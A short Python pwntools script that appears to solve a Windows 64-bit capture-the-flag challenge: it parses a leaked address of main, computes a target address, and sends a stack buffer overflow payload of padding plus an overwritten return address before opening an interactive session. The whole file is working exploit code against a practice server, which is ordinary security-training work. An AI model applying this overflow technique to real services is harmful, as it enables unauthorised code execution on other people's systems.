#!/usr/bin/env python3
from pwn import *

# windows 64bit
context(arch='amd64', os='windows')
context.log_level = 'debug'

# nc chall.angelboy.tw 56001
c = remote('chall.angelboy.tw', 56001)


# printf("main: %p\n", &main);
main_addr = c.recvline().split(b': ')[1].strip()
main_addr = int(main_addr, 16)
log.info('main_addr: ' + hex(main_addr))

main_offset = 0x00000000000004f0
shellcode_offset = 0x00000000000004d1
shellcode_addr = main_addr - main_offset + shellcode_offset
log.info('shellcode_addr: ' + hex(shellcode_addr))

# printf("Input:");
# char DstBuf[56]; // [rsp+20h] [rbp-38h] BYREF
payload = b'A' * 0x38 + p64(shellcode_addr)
c.sendline(payload)

c.interactive()
